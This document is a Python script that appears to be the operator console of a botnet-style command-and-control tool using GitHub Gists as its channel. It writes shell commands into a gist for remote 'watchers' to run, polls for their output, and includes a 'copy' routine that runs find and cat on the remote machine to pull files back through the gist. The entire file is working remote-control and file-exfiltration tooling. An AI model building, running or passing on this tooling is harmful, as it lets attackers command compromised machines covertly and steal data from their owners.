import argparse
import time
import requests
import base64
import json
import re


API = "https://api.github.com/gists"
FILE = "gistfile1.txt"
INTERVAL = 60

BOTS = []
MAIN = -1

def get_text_from_gist():
    path = "{0}/{1}".format(API, MAIN["gist"])
    dist = " "
    r = requests.get(path, headers=MAIN["headers"])

    data = r.json()
    if r.ok is not True:
        print("++++++++++++++++++++++++++++++++++++++++++++++++++++++")
        print("Error occured: {0}".format(data))
        return -1

    files = data.get("files", None)
    file = files.get(FILE, None)

    content = file["content"]
    if file["truncated"]:
        print("File is to big")
        return -1
    
    lines = content.splitlines()
    returnedLines = []

    for l in reversed(lines):
        if l.startswith(">"):
            break
        returnedLines.insert(0, l)

    if len(returnedLines) != 0:
        for l in returnedLines:
            dist += "\n"
            dist += l
    if len(returnedLines) == 1:
        return returnedLines[0]
    return dist

def read_file():
    global MAIN
    if len(BOTS) == 0:
        print("Choose the main watcher!")
        return

    path = "{0}/{1}".format(API, MAIN["gist"])
    r = requests.get(path, headers=MAIN["headers"])

    data = r.json()
    if r.ok is not True:
        print("++++++++++++++++++++++++++++++++++++++++++++++++++++++")
        print("Error occured: {0}".format(data))

    files = data.get("files", None)
    file = files.get(FILE, None)

    try:
        content = file["content"]
        if file["truncated"]:
            print("File is to big")
            return True

        lines = content.splitlines()
        returnedLines = []

        for l in reversed(lines):
            if l.startswith(">"):
                break
            returnedLines.insert(0, l)

        if len(returnedLines) != 0:
            for l in returnedLines:
                print(l)
            return True
    except KeyError:
        print("error reading file with filename {0}".format(MAIN["file"]))

def create(gist, user, token, file):
    global MAIN

    if not file:
        file = FILE

    HEADERS = {'Accept': 'application/vnd.github.v3+json',
               "Authorization": "Basic " + base64.urlsafe_b64encode("{0}:{1}".format(user, token).encode()).decode()}
    BOTS.append({"id": len(BOTS), "gist": gist, "headers": HEADERS, "file": file, "username":user})
    if MAIN == -1:
        MAIN = BOTS[len(BOTS) - 1]
    return len(BOTS) - 1

def delete(id):
    global MAIN
    try:
        if MAIN != -1 and MAIN["id"] == id:
            print(
                "Cannot delete current watcher with id {0}. Switch to another bot to delete the current one".format(id))
            return
        del BOTS[int(id)]
    except:
        print("Cannot delete watcher with id {0}".format(id))

def getAllUsers():
    print("ID")
    print("-----------------------\n")
    for key in range(0,len(BOTS)):
        print(BOTS[key].get("username"))

def switch(id):
    global MAIN
    try:
        MAIN = BOTS[id]
    except KeyError:
        print("Watcher with id {0} does not exist. Try blist command to see all available bots or bcreate to create a "
              "new one".format(id))

def write_to_file(file_content):
    global MAIN
    if MAIN == -1:
        print("Choose the main watcher!")
        return
    path = "{0}/{1}".format(API, MAIN["gist"])
    data = {"files": {MAIN["file"]: {"content": file_content}}}
    r = requests.patch(path, headers=MAIN["headers"], data=json.dumps(data))
    if r.ok is not True:
        print("++++++++++++++++++++++++++++++++++++++++++++++++++++++")
        print("Error occured: {0}".format(data))

def copy(file):
    find_command = ">find . -name {0}".format(file)
    dist = ""

    write_to_file(find_command)
    while True:
        read = read_file()
        if not read:
            print("================= Waiting =================")
            time.sleep(INTERVAL)
        else:
            break
    
    dist = get_text_from_gist()

    if(dist is not -1):
        cat_command = "> cat {0}".format(dist)
        write_to_file(cat_command)
        while True:
            read = read_file()
            if not read:
                print("================= Waiting =================")
                time.sleep(INTERVAL)
            else:
                break
        
        text_from_file = get_text_from_gist()

        try:
            copied_file = open("copied_{0}".format(file),"w")
            copied_file.write(text_from_file)
            copied_file.close()

            print("================= File copied successfully =================")
        except Exception as e:
            print("++++++++++++++++++++++++++++++++++++++++++++++++++++++")
            print("Error occured: {0}".format(str(e)))

def printCurrentUserId():
    print(BOTS[MAIN.get("id")].get("username"))

print("================= Starting Controller =================")

parser = argparse.ArgumentParser()

parser.add_argument('--interval', type=str)

args = parser.parse_args()

if args.interval is not None:
    INTERVAL = int(args.interval)

print("""
Commands:
create <gist id> <user> <token> [file]- creates a new page watcher 
delete <id> - deletes page watcher
switch <id> - switches to another page watcher
w - list of logined users
check - check if there is an output from a watcher
id - current user id
""")

while True:
    command = input(">")
    if command.startswith("create"):
        args = command.split()[1:]
        if len(args) == 3:
            id = create(args[0], args[1], args[2], FILE)
            print("Created new watcher with id {0}".format(str(id)))
            print("Main watcher is {0}".format(MAIN["id"]))
        elif len(args) == 4:
            id = create(args[0], args[1], args[2], args[3])
            print("Created new watcher with id {0}".format(str(id)))
            print("Main watcher is {0}".format(MAIN["id"]))
        else:
            print("Invalid arguments")
    elif command.startswith("delete"):
        args = command.split()[1:]
        if len(args) == 1:
            delete(args[0])
        else:
            print("Invalid arguments")
    elif command.startswith("switch"):
        args = command.split()[1:]
        if len(args) == 1:
            switch(args[0])
        else:
            print("Invalid arguments")
    elif command.startswith("w"):
        getAllUsers()
    elif command.startswith("id"):
        printCurrentUserId()
    elif command.startswith("check"):
        while True:
            read = read_file()
            if (not read):
                print("================= Waiting =================")
                time.sleep(INTERVAL)
            else:
                break
    elif command.startswith("copy"):
        if args[0] is not None:
            args = command.split()[1:]
            copy(args[0])
        else:
            print("================= FILE NAME IS MISSING =================")
    else:
        write_to_file(">" + command)
        while True:
            read = read_file()
            if not read:
                print("================= Waiting =================")
                time.sleep(INTERVAL)
            else:
                break
    